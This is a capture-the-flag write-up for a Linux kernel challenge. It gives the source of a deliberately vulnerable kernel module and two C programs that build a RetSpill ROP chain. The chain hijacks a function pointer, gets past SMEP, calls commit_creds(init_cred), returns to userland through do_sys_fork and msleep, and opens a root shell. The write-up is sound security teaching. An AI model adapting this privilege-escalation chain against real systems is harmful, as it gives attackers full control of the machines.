SpillMe

March 31, 2026

Introduction

In this challenge we are provided with the zip SpillMe.zip containing the following files:

  • A compressed kernel image: bzImage
  • A compressed filesystem: rootfs.cpio.gz
  • A script to start qemu: run.sh
  • A kernel module source code: vuln.c

Environment Setup

The Linux Kernel

The first thing we’ll do is decompress the bzImage to get the Linux Kernel image. I’ll use the script extract-image.sh

1

./extract-image.sh ./bzImage > vmlinux

We do this to be able to debug later, and to find ROP gadgets. To find gadgets in Kernel images I use this tool: kropr

1

kropr vmlinux > GADGETS.txt

The Filesystem

To decompress the filesystem we’ll run the following commands:

In the root we find the init script. For later debugging purposes we’ll modify one line of the script:

With this we’ll make the system start us as the root user.

When we go to test our exploit we must change this back to 1000 to see if we’ve actually escalated privileges, and avoid false positives.

#!/bin/sh

qemu-system-x86_64 \
    -kernel  bzImage      \
    -initrd  rootfs.cpio.gz \
    -nographic            \
    -monitor /dev/null    \
    -append "console=ttyS0 root=/dev/ram rdinit=/init oops=panic panic=-1 quiet nokaslr" \
    -m 128M               \
    -smp 2                \
    -cpu qemu64,+smep,+smap \
    -no-reboot            \
    -no-shutdown

Some notable flags are:

  • -kernel specifies the compressed kernel image
  • -initrd specifies the compressed filesystem
  • -append specifies additional boot options, here we can see that KASLR is disabled, and Oops on Panic is enabled
  • -m specifies the virtual machine memory
  • -cpu specifies the CPU model and some enabled protections like SMAP and SMEP

The first thing we’ll do is add the -s flag. This option lets us debug the kernel from our host machine, opening port 1234. Simply run the following command in gdb once you’ve started the virtual machine:

1

(gdb) target remote :1234

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/workqueue.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Zereza");

#define VULN_WRITE   0xDEAD0001
#define VULN_EXEC    0xDEAD0002

static void (*fn_ptr)(void) = NULL;

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {

    case VULN_WRITE: {
        uint64_t addr;
        if (copy_from_user(&addr, (void __user *)arg, sizeof(addr)))
            return -EFAULT;
        fn_ptr = (void (*)(void))addr;
        return 0;
    }

    case VULN_EXEC: {
        if(arg != 0){
          return -EFAULT;
        }

        if(fn_ptr) fn_ptr();
        return 0;
    }

    default:
        return -EINVAL;
    }
}

static int      vuln_open   (struct inode *i, struct file *f) { return 0; }
static int      vuln_release(struct inode *i, struct file *f) { return 0; }

static const struct file_operations vuln_fops = {
    .owner          = THIS_MODULE,
    .open           = vuln_open,
    .release        = vuln_release,
    .unlocked_ioctl = vuln_ioctl,
};

static struct miscdevice vuln_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = "vuln",
    .fops  = &vuln_fops,
};

module_misc_device(vuln_dev);

We can observe the vuln_ioctl function which accepts two commands:

  1. VULN_WRITE: Lets us write 8 bytes into the global variable fn_ptr
  2. VULN_EXEC: Checks that arg is 0 (this is done to prevent register control), and executes fn_ptr as a function

We have Control Flow Hijack (CHF)! But… how do we go from this to privilege escalation?

We can execute whatever function we want, but we don’t have control over the arguments, so we can’t do commit_creds(init_cred) or something similar.

We also can’t do a ret2user because we have Supervisor Mode Execution Protection (SMEP), which prevents Userland pages from being executable from Kernel mode.

Furthermore, we don’t have control over registers or write capability to pivot to a ROP Chain in a conventional way.

RetSpill

RetSpill allows transforming a limited CFH in Kernel into a more powerful primitive by taking advantage of how the kernel manages the stack.

You can find more information about this technique here: RetSpill

What we achieve with this technique is taking advantage of the fact that when making a syscall, the Kernel saves the pt_regs structure with our Userland registers on the stack.

We can write our ROP Chain in the registers before calling the syscall and pivot with an add rsp, X ; ret gadget.

Exploitation

The first thing to do is see how far our ROP Chain is from the RSP at the moment of function execution, and in what order the registers are placed.

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define VULN_WRITE 0xDEAD0001
#define VULN_EXEC 0xDEAD0002

void trigger_retspill(int fd){
  ulong r15 = 0x4141414141414141;
  ulong r14 = 0x4242424242424242;
  ulong r13 = 0x4343434343434343;
  ulong r12 = 0x4444444444444444;
  ulong r11 = 0x4545454545454545;
  ulong r10 = 0x4646464646464646;
  ulong r9 = 0x4747474747474747;
  ulong r8 = 0x4848484848484848;
  ulong rbx = 0x4949494949494949;

  ulong rax = SYS_ioctl;
  ulong rdi = fd;
  ulong rsi = VULN_EXEC;
  ulong rdx = 0;

  __asm__ volatile (
      "syscall"
      : "+b"(rbx), "+r"(r15), "+r"(r14), "+r"(r13), "+r"(r12), "+r"(r10), "+r"(r9), "+r"(r8)
      : "a"(rax), "D"(rdi), "S"(rsi), "d"(rdx)
      : "rcx", "memory"
      );
}

int main(){
  ulong fn_ptr = 0xdeadbeefdeadbeef;
  int fd = open("/dev/vuln", O_RDWR);
  if(fd<0){
    puts("ERROR");
    exit(-1);
  }

  ioctl(fd, VULN_WRITE, &fn_ptr);
  trigger_retspill(fd);

  return 0;
}

Here we can see that we have no control over the registers.

We observe the stack state in gdb:

Our Userland registers are there! The offset from RSP to the first register is 0x80.

It’s important to look at where RSP points during the Kernel Panic, not in gdb.

The next step is to find a gadget of type add rsp, X ; ret that pivots us to that zone. From the dump that kropr gave us earlier we found this gadget:

1

0xffffffff81f8430d: add rsp, 0x78; pop rbx; ret;

Since Kernel Address Space Layout Randomization (KASLR) is disabled, this address doesn’t change, same with the rest of the gadgets we’ll use in the ROP Chain. If this protection were enabled we’d need to get a LEAK.

Building the ROP Chain

Now that we have the order in which the registers appear on the stack and our gadget to pivot, let’s build the ROP Chain.

Since we’re in Kernel Mode we’ll need to make sure to return safely to Userland after escalating privileges. Since we don’t have enough space on the stack to use a KPTI Trampoline, I’ll return using the Telefork technique. This technique is based on using do_sys_fork and msleep to return to Userland. When returning with this technique I got a SIGSEGV, so I’ll create a handler.

For the ROP Chain we’ll do the following:

commit_creds(init_cred); do_sys_fork(); msleep(big_number)

And the ROP Chain would look like this:

pop rdi; ret
init_cred
commit_creds
pop rdi; ret
pop rsi; ret
do_sys_fork
msleep

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <signal.h>
#include <unistd.h>

#define VULN_WRITE 0xDEAD0001
#define VULN_EXEC 0xDEAD0002

#define ADD_RSP_0X78_POP1_RET 0xffffffff81f8430d
#define POP_RDI_RET 0xffffffff8229a95d
#define POP_RSI_RET 0xffffffff8229aa15

#define COMMIT_CREDS 0xffffffff813357d0
#define INIT_CRED 0xffffffff82c0f5c0
#define DO_SYS_FORK 0xffffffff812fc4f0
#define MSLEEP 0xffffffff813c2e90

void get_shell(int sig){
  if(getuid() == 0){
    puts("UID: 0");
    puts("GETTING SHELL...");
    system("/bin/sh");
  }
  printf("UID: %d\n", getuid());
  exit(-1);
}

void trigger_retspill(int fd){
  ulong r15 = POP_RDI_RET; // 1 POS
  ulong r14 = INIT_CRED; // 2 POS
  ulong r13 = COMMIT_CREDS; // 3 POS
  ulong r12 = POP_RDI_RET; // 4 POS
  ulong rbx = POP_RSI_RET; // 6 POS
  ulong r10 = DO_SYS_FORK; // 8 POS
  ulong r9 = MSLEEP; // 9 POS
  ulong r8 = 0x4848484848484848; // 10 POS
  ulong r11 = 0x4545454545454545;

  ulong rax = SYS_ioctl;
  ulong rdi = fd;
  ulong rsi = VULN_EXEC;
  ulong rdx = 0;

  __asm__ volatile (
      "syscall"
      : "+b"(rbx), "+r"(r15), "+r"(r14), "+r"(r13), "+r"(r12), "+r"(r11), "+r"(r10), "+r"(r9), "+r"(r8)
      : "a"(rax), "D"(rdi), "S"(rsi), "d"(rdx)
      : "rcx", "memory"
      );
}

int main(){
  signal(SIGSEGV, get_shell);
  ulong fn_ptr = ADD_RSP_0X78_POP1_RET;
  int fd = open("/dev/vuln", O_RDWR);
  if(fd<0){
    puts("ERROR");
    exit(-1);
  }

  ioctl(fd, VULN_WRITE, &fn_ptr);
  trigger_retspill(fd);

  return 0;
}
